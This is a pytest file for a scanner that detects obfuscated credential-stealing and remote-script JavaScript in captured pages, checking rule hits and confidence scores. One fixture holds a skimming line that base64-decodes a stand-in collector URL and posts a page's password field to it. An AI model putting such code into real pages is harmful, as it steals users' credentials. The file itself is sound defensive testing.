from pathlib import Path

import pytest

from brain.decide import confidence
from brain.fetcher import Capture, load_capture
from brain.scan import scan_capture
from tests.test_brain import needs_semgrep

SAMPLES = Path(__file__).resolve().parent.parent / "samples"


@needs_semgrep
@pytest.mark.parametrize("sample,rule,score", [
    ("evasive", "decoded-credential-request", 0.6),
    ("obfuscated-eval", "escaped-remote-script", 0.64),
])
def test_missed_samples_are_now_verified(sample, rule, score):
    findings = scan_capture(load_capture(SAMPLES / "malicious" / sample))
    assert rule in {finding.rule for finding in findings}
    assert confidence(findings) == score


@needs_semgrep
@pytest.mark.parametrize("sample", ["decoded-request", "escaped-markup"])
def test_obfuscation_benign_samples_stay_below_threshold(sample):
    findings = scan_capture(load_capture(SAMPLES / "benign" / sample))
    assert not {"decoded-credential-request", "escaped-remote-script"} & {
        finding.rule for finding in findings
    }
    # The pre-existing loader rule notices escaped markup at weight 0.4;
    # benign text must not acquire a second rule and become VERIFIED.
    assert confidence(findings) < 0.6


@needs_semgrep
def test_decoded_url_direct_fetch_and_password_variable_binding(tmp_path):
    (tmp_path / "inline_0.js").write_text('''
const target = atob("aHR0cHM6Ly9jb2xsZWN0b3IuZXhhbXBsZS9sb2c=");
fetch(target, {method: "POST", body: document.getElementById("password").value});
fetch("/login", {method: "POST", body: document.getElementById("password").value});
''', encoding="utf-8")
    findings = scan_capture(Capture(url="https://login.example/", directory=tmp_path, ok=True))
    matches = [finding for finding in findings if finding.rule == "decoded-credential-request"]
    assert len(matches) == 1
    assert matches[0].line == 3
